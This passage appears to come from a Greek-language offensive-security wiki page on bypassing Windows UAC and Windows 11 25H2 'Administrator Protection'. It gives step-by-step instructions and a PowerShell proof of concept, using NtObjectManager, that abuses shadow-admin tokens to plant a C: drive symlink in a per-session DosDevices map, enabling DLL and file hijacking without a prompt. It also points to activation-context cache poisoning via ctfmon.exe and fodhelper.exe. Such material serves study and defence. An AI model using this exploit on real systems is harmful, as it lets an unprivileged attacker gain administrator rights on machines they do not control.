Ορισμένες αλυσίδες μετά το 2024 δεν μοιάζουν πλέον με τα κλασικά `HKCU\Software\Classes` registry hijacks. Για παράδειγμα, το activation-context cache poisoning μπορεί να συνδυάσει ένα **drive remap** και ένα **DLL redirection**, ώστε να μεταβεί από medium σε high integrity μέσω trusted UI / auto-elevated binaries όπως το `ctfmon.exe` και, στη συνέχεια, targets όπως το `fodhelper.exe`. Αντί να αντιγράψετε εδώ το μεγάλο PoC, ελέγξτε τα compact payload examples στο:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack μέσω per-logon-session DOS device map

Για το πλήρες attack surface των `RAiLaunchAdminProcess` / UIAccess στο Windows 11 25H2, ελέγξτε την dedicated σελίδα:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Το Windows 11 25H2 “Administrator Protection” χρησιμοποιεί shadow-admin tokens με per-session `\Sessions\0\DosDevices/<LUID>` maps. Το directory δημιουργείται lazily από το `SeGetTokenDeviceMap` κατά το πρώτο `\??` resolution. Αν ο attacker κάνει impersonate το shadow-admin token μόνο σε **SecurityIdentification**, το directory δημιουργείται με τον attacker ως **owner** (κληρονομεί το `CREATOR OWNER`), επιτρέποντας drive-letter links που έχουν προτεραιότητα έναντι του `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Βήματα:**

1. Από μια low-privileged session, καλέστε το `RAiProcessRunOnce` για να κάνετε spawn ένα promptless shadow-admin `runonce.exe`.
2. Κάντε duplicate το primary token του σε ένα **identification** token και κάντε impersonate αυτό το token ενώ ανοίγετε το `\??`, ώστε να εξαναγκάσετε τη δημιουργία του `\Sessions\0\DosDevices/<LUID>` με ownership του attacker.
3. Δημιουργήστε ένα `C:` symlink εκεί, το οποίο δείχνει σε attacker-controlled storage· οι επόμενες filesystem accesses σε εκείνη τη session θα επιλύουν το `C:` προς το attacker path, επιτρέποντας DLL/file hijack χωρίς prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Αναφορές

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Πώς λειτουργεί το User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Συλλογή τεχνικών παράκαμψης του UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner συμβατότητας και launcher για παράκαμψη του UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – Το KONNI υιοθετεί AI για τη δημιουργία PowerShell backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Εκμετάλλευση 0-Day εναντίον κυβερνητικών στόχων στη Νοτιοανατολική Ασία](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Παράκαμψη της προστασίας διαχειριστή των Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Παράκαμψη του UAC με χρήση του task SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
